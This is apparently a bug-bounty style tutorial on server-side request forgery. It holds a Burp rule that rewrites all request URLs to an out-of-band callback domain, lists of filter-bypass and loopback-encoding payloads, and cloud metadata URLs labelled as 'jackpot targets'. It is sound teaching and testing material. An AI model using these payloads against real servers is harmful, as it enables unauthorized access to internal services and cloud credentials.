---
title: "SSRF Tutorial"
data: 2025-11-03
categories: [writeups, tutorials, ssrf]
tags: [SSRF, tutorials, web-security]
---
---

## 1. Introduction to SSRF
**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to induce the server-side application to make unintended HTTP requests to internal or external resources. This can lead to:

- Access to internal services (e.g., metadata endpoints)
- Data exfiltration
- Remote code execution (in advanced cases)
- Network reconnaissance

---

## **2. Vulnerable Features (Common Entry Points)**

SSRF often manifests in features that accept user-supplied URLs or process external data:

| Feature | Risk Level | Example |
|--------|------------|---------|
| **Profile Image Loaders** | High | `avatar_url=http://internal-app/admin` |
| **Webhook Services** | High | Custom callbacks to internal APIs |
| **PDF Generators / Previewers** | Medium | `?url=http://169.254.169.254/latest/meta-data/` |
| **Unrestricted File Uploads (XML/XXE)** | High | SVG/XML with external entity resolution |
| **CORS Proxies** | High | Bypassing browser restrictions via backend fetch |
| **Header Processing** | Medium | `Host`, `X-Forwarded-For`, `Referer` manipulation |

> **Pro Tip**: Look for any input that triggers an outgoing HTTP request from the server.

---

## **3. Automation: Match & Replace Rule**

Use **Burp Suite Intruder** or **Param Miner** with this **match-and-replace** rule to fuzz all URLs in requests:

### **Match (Regex)**
```text
https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)
```
### **Replace With (Your Payload Server)**
```text
http://random.oastify.com
```
> Replace `br610...` with your Interactsh, Burp Collaborator, or Canary Token domain.

## **4. Advanced Payload Variations (Bypass Filters)**

Many apps filter 127.0.0.1, localhost, or 169.254.169.254. Use these encodings:
```text
//{CANARY_TOKEN}
\\\\{CANARY_TOKEN}
////{CANARY_TOKEN}
\\\\\\\\{CANARY_TOKEN}
http:{CANARY_TOKEN}
https:{CANARY_TOKEN}
/%00/{CANARY_TOKEN}
/%0A/{CANARY_TOKEN}
/%0D/{CANARY_TOKEN}
/%09/{CANARY_TOKEN}
```

Localhost & Loopback Bypasses
```text
http://127.1/%2561dmin/
http://127.1/
http://127.0.1/
http://127.0.0.1/
http://127/
http://127.0/
http://127.0.0/
http://127.000.000.001
http://2130706433/                  → Decimal IP (127.0.0.1)
http://0x7f000001/                  → Hex
http://0x7f.0x00.0x00.0x01/
http://017700000001/                → Octal
http://0177.0.0.1/
http://::1/
http://[::1]/
http://0:0:0:0:0:0:0:1/
http://::ffff:127.0.0.1/
http://::ffff:2130706433/
http://localhost/
http://localhost>./
http://127>%2E0%2E0%2E1/
http://[::ffff:127.0.0.1]:8080/
http://user:pass@127.0.0.1/
```

## **5. Cloud Metadata Endpoints (Jackpot Targets)**

| Provider | Metadata URL |
|----------|--------------|
| AWS | http://169.254.169.254/latest/meta-data/ |
| Google Cloud | http://metadata.google.internal/computeMetadata/v1beta1/ |
| DigitalOcean | http://169.254.169.254/metadata/v1.json |
| Azure | http://169.254.169.254/metadata/instance?api-version=2021-02-01 |

## **6. Exploitation Labs (PortSwigger)**
1. [LabLinkSSRF Filter Bypass via Open Redirection](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
2. [Blind SSRF with Shellshock](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

## **7. Resources**
- [How to search for SSRF](https://youtu.be/Ku6CK3Aes8Y?si=7YyZ6rVBjpyy4C3i)
- [Guide to exploiting SSRF](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-a-complete-guide-to-exploiting-advanced-ssrf-vulnerabilities)